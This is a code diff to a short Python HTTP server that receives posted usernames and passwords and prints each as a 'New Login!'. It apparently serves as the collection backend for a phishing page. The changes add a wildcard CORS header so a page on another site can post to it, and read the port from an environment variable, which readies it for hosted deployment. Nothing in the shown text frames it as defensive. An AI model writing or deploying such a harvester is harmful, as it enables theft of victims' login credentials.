@@ -1,6 +1,7 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import parse_qs
 from datetime import datetime
+import os
 
 class H(BaseHTTPRequestHandler):
     def log_message(self,f,*a): pass
@@ -14,15 +15,17 @@ class H(BaseHTTPRequestHandler):
         u=d.get("username",[""])[0]
         p=d.get("password",[""])[0]
         t=datetime.now().strftime("%H:%M:%S")
-        print("\n\033[1m"+"="*35+"\033[0m")
-        print(f"\033[92m  New Login! [{t}]\033[0m")
-        print(f"\033[93m  Username : {u}\033[0m")
-        print(f"\033[91m  Password : {p}\033[0m")
-        print("\033[1m"+"="*35+"\033[0m")
+        print("="*35, flush=True)
+        print(f"New Login! [{t}]", flush=True)
+        print(f"Username : {u}", flush=True)
+        print(f"Password : {p}", flush=True)
+        print("="*35, flush=True)
         self.send_response(200)
         self.send_header("Content-type","text/plain")
+        self.send_header("Access-Control-Allow-Origin","*")
         self.end_headers()
         self.wfile.write(b"ok")
 
-print("\033[96m\033[1m Waiting for logins on port 8080...\033[0m\n")
-HTTPServer(("0.0.0.0",8080),H).serve_forever()
+port = int(os.environ.get("PORT", 8080))
+print(f"Waiting for logins on port {port}...", flush=True)
+HTTPServer(("0.0.0.0", port), H).serve_forever()
